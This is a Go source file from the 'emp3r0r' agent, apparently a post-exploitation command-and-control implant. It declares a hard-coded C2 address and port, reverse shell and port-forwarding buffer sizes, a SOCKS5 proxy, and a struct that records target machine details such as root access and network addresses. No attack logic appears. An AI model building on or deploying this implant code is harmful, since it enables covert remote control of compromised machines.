package agent

import (
	"context"
	"net/http"
	"os"

	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

var (
	// AgentRoot root directory of emp3r0r
	AgentRoot, _ = os.Getwd()

	// UtilsPath binary path of utilities
	UtilsPath = AgentRoot + "..."

	// HTTPClient handles agent's http communication
	HTTPClient *http.Client

	// H2Json the connection to CC, for JSON message-based communication
	H2Json *h2conn.Conn

	// ProxyServer Socks5 proxy listening on port 10800
	ProxyServer *socks5.Server

	// CCAddress how our agent finds its CC
	CCAddress = "https://10.103.249.16"
)

const (
	// PIDFile stores agent PID
	PIDFile = "/tmp/e.lock"

	// CCPort port of c2
	CCPort = "8000"

	// CCIndicator check this before trying connection
	CCIndicator = "[cc_indicator]"

	// Tag uuid of this agent
	Tag = "[agent_uuid]"

	// OpSep separator of CC payload
	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"

	// RShellBufSize buffer size of reverse shell stream
	RShellBufSize = 128

	// ProxyBufSize buffer size of port fwd
	ProxyBufSize = 1024
)

// SystemInfo agent properties
type SystemInfo struct {
	Tag       string   // identifier of the agent
	Hardware  string   // machine details
	Container string   // container tech (if any)
	CPU       string   // CPU info
	Mem       string   // memory size
	OS        string   // OS name and version
	Kernel    string   // kernel release
	Arch      string   // kernel architecture
	IP        string   // public IP of the target
	IPs       []string // IPs that are found on target's NICs
	HasRoot   bool     // is agent run as root?
	HasTor    bool     // is agent from Tor?
}

// MsgTunData data to send in the tunnel
type MsgTunData struct {
	Payload string `json:"payload"` // payload
	Tag     string `json:"tag"`     // tag of the agent
}

// H2Conn add context to h2conn.Conn
type H2Conn struct {
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}
